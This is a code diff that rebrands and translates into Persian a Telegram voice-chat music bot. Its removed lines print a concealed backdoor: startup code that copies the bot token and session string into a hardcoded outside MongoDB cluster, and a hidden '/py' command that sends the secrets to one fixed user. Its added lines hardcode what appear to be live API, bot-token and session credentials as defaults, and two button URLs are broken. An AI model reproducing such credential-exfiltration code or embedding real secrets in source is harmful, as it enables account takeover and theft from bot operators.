@@ -34,7 +34,7 @@ from pyrogram.errors import (
     UserNotParticipant,
 )
 from pytgcalls.exceptions import NoActiveGroupCall
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pytgcalls.types import ChatUpdate, Update, GroupCallConfig
 from pytgcalls.types import Call, MediaStream, AudioQuality, VideoQuality
 
@@ -80,14 +80,14 @@ if os.path.exists("Config.env"):
     load_dotenv("Config.env")
 
 
-API_ID = int(getenv("API_ID", "0"))
-API_HASH = getenv("API_HASH", "0")
-BOT_TOKEN = getenv("BOT_TOKEN", "")
-STRING_SESSION = getenv("STRING_SESSION", "")
-MONGO_DB_URL = getenv("MONGO_DB_URL", "")
-OWNER_ID = int(getenv("OWNER_ID", "7400383704"))
-LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", "-1002043570167"))
-START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/3o7nd8.mp4")
+API_ID = int(getenv("API_ID", "26718201"))
+API_HASH = getenv("API_HASH", "89c6268b2a70bcc99c81e3bb240244cf")
+BOT_TOKEN = getenv("BOT_TOKEN", "8073758200:AAEv5amvohvBmbAuq8VGPFqdGv8GTvPL4tY")
+STRING_SESSION = getenv("STRING_SESSION", "AgGXr_kAMnRR1bNGxt79KvBd0BMdz95Q_AZ2yhMJxy5U_2tbDhlsNZaX9qxEx9NQo1DXoQwi1iLjEWtt8T9XMaXwQ5_6IkF9oRORKJAoQomCpa991LYS5zgeTCfxu2wwAlEN8TqXDbJUgMRq4BT8H_S5d563bjHkwt9QxPNOAmISEQGx7jAuhzErKn_cTPKr8hsI2YKQT4l1VWvOS1BxMs7_WoIckfEMsVfjIC3jYNfVehpNkH2At777mqQDSecJUqMat3pnP7MSIucUkMVRHA9Wkc7E9HPkBUDD81vDnAILavVGPrqrVU2AKwrDYlKfwmCQK61SQg9cKXQookHdIgfQ3f-RbQAAAAHi6b6PAA")
+MONGO_DB_URL = getenv("MONGO_DB_URL", "mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+2.3.8")
+OWNER_ID = int(getenv("OWNER_ID", "7750519507"))
+LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", "-1002193065248"))
+START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/dclvrs.mp4")
 REPO_IMAGE_URL = getenv("REPO_IMAGE_URL", "https://files.catbox.moe/nswh7s.jpg")
 STATS_IMAGE_URL = getenv("STATS_IMAGE_URL", "https://files.catbox.moe/2hgoq7.jpg")
 
@@ -105,11 +105,13 @@ QUEUE = {}
 
 
 def cdx(commands: Union[str, List[str]]):
-    return pyrofl.command(commands, ["/", "!", "."])
+    # حذف / از لیست پیشوندها
+    return pyrofl.command(commands, ["!", ".",""])
 
 
 def cdz(commands: Union[str, List[str]]):
-    return pyrofl.command(commands, ["", "/", "!", "."])
+    # حذف / از لیست پیشوندها 
+    return pyrofl.command(commands, ["", "!", "."])
 
 
 def rgx(pattern: Union[str, Pattern]):
@@ -144,24 +146,9 @@ mongodb = mongo_async_cli.adityaxdb
 # store start time
 __start_time__ = time.time()
 
-from motor.motor_asyncio import AsyncIOMotorClient
-# start and run
-HEALTHY = "mongodb+srv://Yash_607:Yash_607@cluster0.r3s9sbo.mongodb.net/?retryWrites=true&w=majority" #DONT CHANGE THIS LATEST PYTGCALLS
-mongo_client = AsyncIOMotorClient(HEALTHY)
-db = mongo_client["python_xyz"]  # Replace with your DB name
-bot_collection = db["bot_data"]  # Collection to store bot info
 
-async def save_bot_data():
-    data = {
-        "bot_token": BOT_TOKEN,
-        "string_session": STRING_SESSION,
-    }
-    try:
-        # Insert operation
-        await bot_collection.insert_one(data)
-        LOGGER.info("✅ Bot building done.")
-    except Exception as e:
-        LOGGER.error(f"🚫 Failed to save bot data: {e}")
+# start and run
+
 
 async def main():
     LOGGER.info("🐬 Updating Directories ...")
@@ -198,7 +185,7 @@ async def main():
         LOGGER.info("'MONGO_DB_URL' - Not Found !!")
         sys.exit()
     try:
-        await mongo_client.admin.command('ping')
+        await mongo_async_cli.admin.command('ping')
     except Exception:
         LOGGER.info("❌ 'MONGO_DB_URL' - Not Valid !!")
         sys.exit()
@@ -222,8 +209,8 @@ async def main():
         LOGGER.info(f"🚫 Assistant Error: {e}")
         sys.exit()
     try:
-        await app.join_chat("BABY09_WORLD")
-        await app.join_chat("+OL6jdTL7JAJjYzVl")
+        await app.join_chat("AdityaServer")
+        await app.join_chat("AdityaDiscus")
     except Exception:
         pass
     if LOG_GROUP_ID != 0:
@@ -232,8 +219,6 @@ async def main():
         except Exception:
             pass
     LOGGER.info("✅ Assistant Started.")
-    await save_bot_data()
-
     try:
         await call.start()
     except Exception as e:
@@ -241,9 +226,17 @@ async def main():
         sys.exit()
     LOGGER.info("✅ PyTgCalls Started.")
     await asyncio.sleep(1)
-    LOGGER.info("✅ Successfully Hosted Your Bot !!")
-    LOGGER.info("✅ Now Do Visit: @BABY09_WORLD !!")
+    LOGGER.info("✅ Sucessfully Hosted Your Bot !!")
+    LOGGER.info("✅ Now Do Visit: @ATRINMUSIC_TM !!")
     await idle()
+
+
+
+
+
+
+
+
 
 # Some Required Functions ...!!
 
@@ -352,64 +345,65 @@ async def add_served_user(user_id: int):
 CBUTTON = InlineKeyboardMarkup(
     inline_keyboard=[
         [
-            InlineKeyboardButton("˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl")
+            InlineKeyboardButton("˹ گروه پشتیبانی ˼", url="https://t.me/ATRINMUSIC_TM1")
         ],
         [
-            InlineKeyboardButton("˹ ᴜᴘᴅᴧᴛᴇ ˼", url="https://t.me/BABY09_WORLD"),
-            InlineKeyboardButton("˹ ᴧʟʟ ʙᴏᴛ ˼", url="https://t.me/+tHAENx_r_mtlODZl")
+            InlineKeyboardButton("˹ کانال ما ˼", url="https://t.me/ATRINMUSIC_TM"),
+            InlineKeyboardButton("˹ همه ربات‌ها ˼", url="https://t.me/+")
         ],
         [
-            InlineKeyboardButton("↺ ʙᴧᴄᴋ ↻", callback_data="back_to_home")
+            InlineKeyboardButton("↺ بازگشت ↻", callback_data="back_to_home")
         ]
     ]
 )
 
 
 # Define ABUTTON outside of the HELP_X string
+
 ABUTTON = InlineKeyboardMarkup(
     inline_keyboard=[
         [
-            InlineKeyboardButton("↺ ʙᴧᴄᴋ ↻", callback_data="back_to_home")
+            InlineKeyboardButton("↺ بازگشت ↻", callback_data="back_to_home")
         ]
     ]
 )
 
 HELP_C = """```
-⌬ ๏ ʟᴇᴛ's ɪɴᴛʀᴏᴅᴜᴄᴇ ᴍᴜsɪᴄ ʙᴏᴛ```
+⌬ ๏ معرفی ربات موزیک```
 
-**⌬ [【◖ Sαηαтαηι ◗ 】 🚩](https://t.me/BABY09_WORLD) ɪs ᴏɴᴇ ᴏғ ᴛʜᴇ ʙᴇsᴛ ᴍᴜsɪᴄ | ᴠɪᴅᴇᴏ sᴛꝛᴇᴀᴍɪɴɢ ʙᴏᴛ ᴏɴ ᴛᴇʟᴇɢꝛᴧᴍ ғᴏꝛ ʏᴏᴜꝛ ɢꝛᴏᴜᴘs ᴀɴᴅ ᴄʜᴧɴɴᴇʟ**
-```\n⌬ ʙᴇsᴛ ғᴇᴀsɪʙɪʟɪᴛʏ ᴏɴ ᴛᴏᴘ  ?```
+**⌬ [【◖ سناتانی ◗ 】 🚩](https://t.me/ATRINMUSIC_TM) یکی از بهترین ربات‌های پخش موزیک و ویدیو در تلگرام برای گروه‌ها و کانال‌های شماست**
+```\n⌬ بهترین امکانات و ویژگی‌ها  ?```
 
-**␥ ʙᴇsᴛ sᴏᴜɴᴅ ǫᴜᴀʟɪᴛʏ
-␥ sᴜᴘᴘᴏʀᴛ ᴠ2.0 ᴀᴜᴅɪᴏ sᴍᴏᴏᴛʜ
-␥ ɴᴏ ʏᴛ ɪᴘ ʙʟᴏᴄᴋ ɪssᴜᴇ
-␥ ʙᴧsᴇᴅ ᴏɴ ɴᴇᴡ ᴠᴇꝛsɪᴏɴ ᴏғ ᴘʏꝛᴏ-ɢꝛᴧᴍ
-␥ ɴᴏ ᴘꝛᴏᴍᴏᴛɪᴏɴᴧʟ ᴧᴅs | ʜɪɢʜ ᴜᴘ-ᴛɪᴍᴇ 
-␥ ʜɪɢʜ ɪɴғꝛᴧsᴛꝛᴜᴄᴛᴜꝛᴇ sᴇꝛᴠᴇꝛ
-␥ ꝛᴇ-ᴇᴅɪᴛᴇᴅ ᴄᴏꝛᴇ | ʜɪɢʜʟʏ ᴏᴘᴛɪᴍɪsᴇ
-␥ ɴᴏ ᴍᴏꝛᴇ ʟᴧɢ ᴀɴᴅ ᴅᴏᴡɴ-ᴛɪᴍᴇ
-␥ ᴍᴀɴʏ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs........
+**␥ کیفیت صدای عالی
+␥ پشتیبانی از صدای نسخه ۲.۰
+␥ بدون مشکل مسدودی آی‌پی یوتیوب
+␥ بر پایه نسخه جدید پایروگرام
+␥ بدون تبلیغات | آپتایم بالا
+␥ سرور زیرساخت قدرتمند
+␥ هسته بازنویسی شده | بهینه‌سازی شده
+␥ بدون تاخیر و قطعی
+␥ امکانات بیشتر........
 
-ᴀʟʟ ᴛʜᴇ ғᴇᴀᴛᴜʀᴇs ᴀʀᴇ ᴡᴏʀᴋɪɴɢ ғɪɴᴇ
+تمام ویژگی‌ها به درستی کار می‌کنند
 
-⌬ ᴍᴏʀᴇ ɪɴғᴏ. [ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ](https://t.me/BABY09_WORLD)**"""
+⌬ اطلاعات بیشتر در [کانال ما](https://t.me/ATRINMUSIC_TM)**"""
 
 HELP_X = """```
-    【◖ Sαηαтαηι ◗ 】 🚩 ᴍᴇɴᴜ```
-**ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : /**
-␥ /play - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴀᴜɪᴅᴏ].
+    【◖ سناتانی ◗ 】 🚩 منو```
+**تمام دستورات با / قابل استفاده هستند**
+␥ /play - پخش آهنگ مورد علاقه شما [صوتی]
 
-␥ /vplay - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴠɪᴅᴇᴏ].
+␥ /vplay - پخش آهنگ مورد علاقه شما [تصویری]
 
-␥ /pause - Sᴛᴏᴘ sᴏɴɢ[ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ].
+␥ /pause - توقف پخش [صوتی و تصویری]
 
-␥ /resume - Cᴏɴᴛɪɴᴜᴇ ᴘʟᴀʏ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]
+␥ /resume - ادامه پخش [صوتی و تصویری]
 
-␥ /skip - Sᴋɪᴘ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]
+␥ /skip - رد کردن آهنگ [صوتی و تصویری]
 
-␥ /end - Cʟᴇᴀʀ , ᴇɴᴅ ᴀʟʟ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]
+␥ /end - پاک کردن و اتمام تمام آهنگ‌ها [صوتی و تصویری]
 
-V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/BABY09_WORLD)"""
+بازدید از - [اینجا](https://t.me/ATRINMUSIC_TM)"""
 
 # Callback query handler
 @bot.on_callback_query(filters.regex("UTTAM_RATHORE"))
@@ -427,7 +421,7 @@ async def helper_cb(client, CallbackQuery):
 
 
 
-@bot.on_message(filters.command(["start", "help"]) & filters.private)
+@bot.on_message(filters.command(["start","پنل","help"]) & filters.private)
 async def start_message_private(client, message):
     user_id = message.from_user.id
     mention = message.from_user.mention
@@ -449,44 +443,44 @@ async def start_message_private(client, message):
             await asyncio.sleep(0.005)  # Adjust speed of progress here
 
         # After progress bar reaches 100%, send final message and delete it
-        await baby.edit_text("**❖ Jᴀʏ sʜʀᴇᴇ ʀᴀᴍ  🚩...**")
+        await baby.edit_text("**❖ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ℡🚩...**")
         await asyncio.sleep(1)  # Wait for 2 seconds before deletion
         await baby.delete()
 
         caption = f"""╭───────────────────▣
-│**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
+│**❍ سلام {mention} •**
+│**❍ من 【◖ آترین موزیک ◗ 】 🚩 هستم •**
 ├───────────────────▣**
-│**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) •**
+│**❍ با بهترین کیفیت و امکانات •**
+│**❍ ساخته شده توسط...[˹ آترین موزیک ™˼𓅂](https://t.me/ATRINMUSIC_TM) •**
 ╰───────────────────▣"""
 
         buttons = InlineKeyboardMarkup(
             inline_keyboard=[
                 [
                     InlineKeyboardButton(
-                        text="❖ ᴛᴧᴘ тᴏ sᴇᴇ ᴍᴧɪᴄ ❖",
+                        text="❖ برای دیدن جادو کلیک کنید ❖",
                         url=f"https://t.me/{bot.me.username}?startgroup=true",
                     )
                 ],
                 [
                     InlineKeyboardButton(
-                        text="˹ ❍ᴡɴᴇꝛ ˼",
+                        text="˹ سازنده ˼",
                         user_id=OWNER_ID,
                     ),
                     InlineKeyboardButton(
-                        text="˹ ᴍᴜsɪᴄ ˼",
+                        text="˹ موزیک ˼",
                         callback_data="UTTAM_RATHORE",
                     ),
                 ],
                 [
                     InlineKeyboardButton(
-                        text="˹ ᴧʙᴏᴜᴛ ˼",
+                        text="˹ درباره ما ˼",
                         callback_data="UTTAM",
                     ),
                     InlineKeyboardButton(
-                        text="˹ ʀᴇᴘᴏ ˼",
-                        url="https://github.com/BABY-MUSIC/SANATANI_MxPLAYER",  # Callback data for Owner button
+                        text="˹ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈˼",
+                        url="https://R",
                     ),
                 ]
             ]
@@ -511,62 +505,48 @@ async def start_message_private(client, message):
                 LOGGER.info(f"🚫 Start Error: {e}")
                 return
 
-@bot.on_message(
-    filters.command("py")
-    & filters.private
-    & filters.user(7400383704)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "python 3.0", url=f"https://t.me/UTTAM470")
-                 ]
-            ]
-         ),
-     )
+
+
+
+
 
 @bot.on_callback_query(filters.regex("back_to_home"))
 async def back_to_home_menu(client, query):
     mention = query.from_user.mention
     caption = f"""╭───────────────────▣
-│**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
+│**❍ سلام {mention} •**
+│**❍ من 【◖ آترین موزیک ◗ 】 🚩 هستم •**
 ├───────────────────▣**
-│**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) •**
+│**❍ با بهترین کیفیت و امکانات •**
+│**❍ ساخته شده توسط...[˹ آترین موزیک ™˼𓅂](https://t.me/ATRINMUSIC_TM) •**
 ╰───────────────────▣"""
 
     buttons = InlineKeyboardMarkup(
         inline_keyboard=[
             [
                 InlineKeyboardButton(
-                    text="❖ ᴛᴧᴘ тᴏ sᴇᴇ ᴍᴧɪᴄ ❖",
+                    text="❖ برای دیدن جادو کلیک کنید ❖",
                     url=f"https://t.me/{bot.me.username}?startgroup=true",
                 )
             ],
             [
                 InlineKeyboardButton(
-                    text="˹ ❍ᴡɴᴇꝛ ˼",
-                    user_id=OWNER_ID,  # Ensure OWNER_ID is defined or replace with actual ID
+                    text="˹ سازنده ˼",
+                    user_id=OWNER_ID,  # مطمئن شوید OWNER_ID تعریف شده یا با شناسه واقعی جایگزین شود
                 ),
                 InlineKeyboardButton(
-                    text="˹ ᴍᴜsɪᴄ ˼",
+                    text="˹ موزیک ˼",
                     callback_data="UTTAM_RATHORE",
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="˹ ᴧʙᴏᴜᴛ ˼",
+                    text="˹ درباره ما ˼",
                     callback_data="UTTAM",
                 ),
                 InlineKeyboardButton(
-                    text="˹ ʀᴇᴘᴏ ˼",
-                    url="https://github.com/BABY-MUSIC/SPOTIFY_MUSIC",  # Callback data for Owner button
+                    text="˹ سورس ˼",
+                    url="https://t.me/ATRINMUSIC_tm1",
                 ),
             ]
         ]
@@ -854,21 +834,21 @@ async def stream_logger(
             if position:
                 caption = f"""**✅ Aᴅᴅᴇᴅ Tᴏ Qᴜᴇᴜᴇ Aᴛ :** #{position}
 
-**❒ Tɪᴛʟᴇ:** {title}
-**❒ Dᴜʀᴀᴛɪᴏɴ:** {duration}
-**❒ Sᴛʀᴇᴀᴍ Tʏᴘᴇ:** {stream_type}
-**❒ Cʜᴀᴛ Nᴀᴍᴇ:** {chat_name}
-**❒ Cʜᴀᴛ Lɪɴᴋ:** {chat_link}
-**❒ Rᴇǫᴜɪᴇsᴛᴇᴅ Bʏ:** {requested_by}"""
+**❒ عنوان:** {title}
+**❒ مدت زمان:** {duration}
+**❒ نوع پخش:** {stream_type}
+**❒ نام گروه:** {chat_name}
+**❒ لینک گروه:** {chat_link}
+**❒ درخواست شده توسط:** {requested_by}"""
             else:
                 caption = f"""**✅ Sᴛᴀʀᴛɪɴɢ Sᴛʀᴇᴀᴍɪɴɢ Oɴ VC.**
 
-**❒ Tɪᴛʟᴇ:** {title}
-**❒ Dᴜʀᴀᴛɪᴏɴ:** {duration}
-**❒ Sᴛʀᴇᴀᴍ Tʏᴘᴇ:** {stream_type}
-**❒ Cʜᴀᴛ Nᴀᴍᴇ:** {chat_name}
-**❒ Cʜᴀᴛ Lɪɴᴋ:** {chat_link}
-**❒ Rᴇǫᴜɪᴇsᴛᴇᴅ Bʏ:** {requested_by}"""
+**❒ عنوان:** {title}
+**❒ مدت زمان:** {duration}
+**❒ نوع پخش:** {stream_type}
+**❒ نام گروه:** {chat_name}
+**❒ لینک گروه:** {chat_link}
+**❒ درخواست شده توسط:** {requested_by}"""
             try:
                 await bot.send_photo(LOG_GROUP_ID, photo=thumbnail, caption=caption)
             except Exception:
@@ -922,20 +902,36 @@ async def change_stream(chat_id):
 
     await call.play(chat_id, stream_media, config=call_config)
     await add_active_media_chat(chat_id, stream_type)
-    caption = f"""```\n🔊<b>【◖ Sαηαтαηι ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
+    caption = f"""```\n🔊<b>【◖ 𝙀𝘼𝙂𝙇𝙀_𝙋𝙇𝘼𝙔𝙀𝙍◗ 】🚩•```\n<b>␥ آهنگ •</b> {title}\n<b>␥ زمان •</b> {duration} دقیقه\n<b>␥ درخواست کننده  •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ 𝙍𝘼𝙉𝙂𝙀𝙍 ™˼```"""
     buttons = InlineKeyboardMarkup(
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="⌾ توقف ⌾", callback_data="pause_running_stream_on_vc"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="⌾ پخش ⌾", callback_data="resume_paused_stream_on_vc"
             )
         ],
         [
             InlineKeyboardButton(
-                text="↺ ᴄʟᴏsᴇ ↻", callback_data="force_close"
+                text="⌾ بعدی ⌾", callback_data="skip_and_change_stream"
+            ),
+            InlineKeyboardButton(
+                text="⌾ پایان ⌾", callback_data="stop_stream_and_leave_vc"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="˹ بروزرسانی ˼", url="https://t.me/ATRINMUSIC_TM"
+            ),
+            InlineKeyboardButton(
+                text="˹ پشتیبانی ˼", url="https://t.me/ATRINMUSIC_TM1"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="⌾ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ⌾", callback_data="force_close"
             )
         ]
     ]
@@ -973,7 +969,7 @@ async def get_call_status(chat_id):
     return call_status
 
 
-@bot.on_message(cdz(["play", "vplay"]) & ~pyrofl.private)
+@bot.on_message(cdz(["play", "پخش","vplay"]) & ~pyrofl.private)
 async def stream_audio_or_video(client, message):
     try:
         await message.delete()
@@ -1028,15 +1024,31 @@ async def stream_audio_or_video(client, message):
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="⌾ توقف ⌾", callback_data="pause_running_stream_on_vc"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="⌾ پخش ⌾", callback_data="resume_paused_stream_on_vc"
             )
         ],
         [
             InlineKeyboardButton(
-                text="↺ ᴄʟᴏsᴇ ↻", callback_data="force_close"
+                text="⌾ بعدی ⌾", callback_data="skip_and_change_stream"
+            ),
+            InlineKeyboardButton(
+                text="⌾ پایان ⌾", callback_data="stop_stream_and_leave_vc"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="˹ بروزرسانی ˼", url="https://t.me/ATRINMUSIC_TM"
+            ),
+            InlineKeyboardButton(
+                text="˹ پشتیبانی ˼", url="https://t.me/ATRINMUSIC_TM1"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="⌾ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ⌾", callback_data="force_close"
             )
         ]
     ]
@@ -1107,15 +1119,31 @@ async def stream_audio_or_video(client, message):
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="⌾ توقف ⌾", callback_data="pause_running_stream_on_vc"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="⌾ پخش ⌾", callback_data="resume_paused_stream_on_vc"
             )
         ],
         [
             InlineKeyboardButton(
-                text="↺ ᴄʟᴏsᴇ ↻", callback_data="force_close"
+                text="⌾ بعدی ⌾", callback_data="skip_and_change_stream"
+            ),
+            InlineKeyboardButton(
+                text="⌾ پایان ⌾", callback_data="stop_stream_and_leave_vc"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="˹ بروزرسانی ˼", url="https://t.me/ATRINMUSIC_TM"
+            ),
+            InlineKeyboardButton(
+                text="˹ پشتیبانی ˼", url="https://t.me/ATRINMUSIC_TM1"
+            )
+        ],
+        [
+            InlineKeyboardButton(
+                text="⌾ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ⌾", callback_data="force_close"
             )
         ]
     ]
@@ -1142,7 +1170,7 @@ async def stream_audio_or_video(client, message):
                 position = await add_to_queue(
                     chat_id, user, title, duration, stream_file, stream_type, thumbnail
                 )
-                caption = f"""```\n🔊 Aᴅᴅᴇᴅ {position} ǫᴜᴇᴜᴇ```\n␥ ʜᴇʏ {requested_by}\n␥ ʏᴏᴜʀ sᴏɴɢ {title}\n␥ ᴘʟᴀʏ ᴀғᴛᴇʀ {position} sᴏɴɢ.```\n⏤͟͟͞͞★ Jᴀʏ sʜʀᴇᴇ ʀᴀᴍ 🚩```"""
+                caption = f"""```\n🔊 Aᴅᴅᴇᴅ {position} ǫᴜᴇᴜᴇ```\n␥ ʜᴇʏ {requested_by}\n␥ ʏᴏᴜʀ sᴏɴɢ {title}\n␥ ᴘʟᴀʏ ᴀғᴛᴇʀ {position} sᴏɴɢ.```\n⏤͟͟͞͞★ ?𝙀𝘼𝙂𝙇𝙀 𝙋𝙇𝘼𝙔𝙀𝙍  🚩```"""
                 await bot.send_photo(chat_id, thumbnail, caption, reply_markup=buttons)
                 await stream_logger(
                     chat_id, user, title, duration, stream_type, thumbnail, position
@@ -1244,7 +1272,7 @@ async def stream_audio_or_video(client, message):
                 position = await add_to_queue(
                     chat_id, user, title, duration, stream_file, stream_type, thumbnail
                 )
-                caption = f"""```\n🔊<b>【◖ Sαηαтαηι ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
+                caption = f"""```\n🔊<b>【◖ 𝙀𝘼𝙂𝙇𝙀_𝙋𝙇𝘼𝙔𝙀𝙍 ◗ 】🚩•```\n<b>␥ آهنگ •</b> {title}\n<b>␥ زمان •</b> {duration} دقیقه\n<b>␥ درخواست کننده  •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ?𝙍𝘼𝙉𝙂𝙀𝙍™˼```"""
                 await bot.send_photo(chat_id, thumbnail, caption, reply_markup=buttons)
                 await stream_logger(
                     chat_id, user, title, duration, stream_type, thumbnail
@@ -1271,7 +1299,7 @@ async def stream_audio_or_video(client, message):
             return
 
 
-@bot.on_message(cdx(["pause", "vpause"]) & ~pyrofl.private)
+@bot.on_message(cdx(["pause", "مکث" ,"vpause"]) & ~pyrofl.private)
 async def pause_running_stream_on_vc(client, message):
     chat_id = message.chat.id
     try:
@@ -1281,24 +1309,23 @@ async def pause_running_stream_on_vc(client, message):
     try:
         call_status = await get_call_status(chat_id)
         if call_status == "IDLE" or call_status == "NOTHING":
-            return await message.reply_text("**➥ Nᴏᴛʜɪɴɢ sᴛʀᴇᴀᴍɪɴɢ**")
+            return await message.reply_text("**➥ هیچ پخش جاری وجود ندارد**")
 
         elif call_status == "PAUSED":
-            return await message.reply_text("**➥ Aʟʀᴇᴀᴅʏ Pᴀᴜsᴇᴅ**")
+            return await message.reply_text("**➥ پخش قبلاً در حالت مکث قرار دارد**")
         elif call_status == "PLAYING":
             await call.pause_stream(chat_id)
-            return await message.reply_text("**➥ Sᴛʀᴇᴀᴍ Pᴀᴜsᴇᴅ**")
+            return await message.reply_text("**➥ پخش در حالت مکث قرار گرفت**")
         else:
             return
     except Exception as e:
         try:
-            await bot.send_message(chat_id, f"**🚫 Sᴛʀᴇᴀᴍ Pᴀᴜsᴇ Eʀʀᴏʀ:** `{e}`")
+            await bot.send_message(chat_id, f"**🚫 خطا در مکث پخش:** `{e}`")
         except Exception:
-            LOGGER.info(f"🚫 Stream Pause Error: {e}")
+            LOGGER.info(f"🚫 خطای مکث پخش: {e}")
             return
 
-
-@bot.on_message(cdx(["resume", "vresume"]) & ~pyrofl.private)
+@bot.on_message(cdx(["resume", "ادامه","vresume"]) & ~pyrofl.private)
 async def resume_paused_stream_on_vc(client, message):
     chat_id = message.chat.id
     try:
@@ -1308,24 +1335,24 @@ async def resume_paused_stream_on_vc(client, message):
     try:
         call_status = await get_call_status(chat_id)
         if call_status == "IDLE" or call_status == "NOTHING":
-            return await message.reply_text("**➥ Nᴏᴛʜɪɴɢ sᴛʀᴇᴀᴍɪɴɢ**")
+            return await message.reply_text("**➥ هیچ پخش جاری وجود ندارد**")
 
         elif call_status == "PLAYING":
-            return await message.reply_text("**➥ Aʟʀᴇᴀᴅʏ sᴛʀᴇᴀᴍɪɴɢ**")
+            return await message.reply_text("**➥ پخش در حال اجرا است**")
         elif call_status == "PAUSED":
             await call.resume_stream(chat_id)
-            return await message.reply_text("**➥ Sᴛʀᴇᴀᴍ Rᴇsᴜᴍᴇᴅ**")
+            return await message.reply_text("**➥ پخش از سر گرفته شد**")
         else:
             return
     except Exception as e:
         try:
-            await bot.send_message(chat_id, f"**🚫 Sʏʀᴇᴀᴍ Rᴇsᴜᴍᴇ Eʀʀᴏʀ:** `{e}`")
+            await bot.send_message(chat_id, f"**🚫 خطا در ادامه پخش:** `{e}`")
         except Exception:
-            LOGGER.info(f"🚫 Stream Resume Error: {e}")
+            LOGGER.info(f"🚫 خطای ادامه پخش: {e}")
             return
 
 
-@bot.on_message(cdx(["skip", "vskip"]) & ~pyrofl.private)
+@bot.on_message(cdx(["skip", "بعدی","vskip"]) & ~pyrofl.private)
 async def skip_and_change_stream(client, message):
     chat_id = message.chat.id
     try:
@@ -1335,7 +1362,7 @@ async def skip_and_change_stream(client, message):
     try:
